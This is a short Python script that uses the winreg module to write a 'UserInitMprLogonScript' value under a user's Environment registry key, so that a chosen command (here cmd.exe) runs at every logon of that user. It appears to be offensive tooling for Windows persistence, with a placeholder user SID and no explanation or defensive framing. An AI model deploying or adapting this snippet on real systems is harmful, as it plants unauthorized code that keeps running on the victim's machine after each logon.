import winreg

# Windows logon script keys
# reghive = winreg.HKEY_CURRENT_USER
# regpath = "Environment"

reghive = winreg.HKEY_USERS
userSID = "<userSID>"
regpath = userSID+"\Environment"

command = "cmd.exe"

# add a registry logon script
key = winreg.OpenKey(reghive,regpath,0,access=winreg.KEY_WRITE)
winreg.SetValueEx(key,"UserInitMprLogonScript",0,winreg.REG_SZ,command)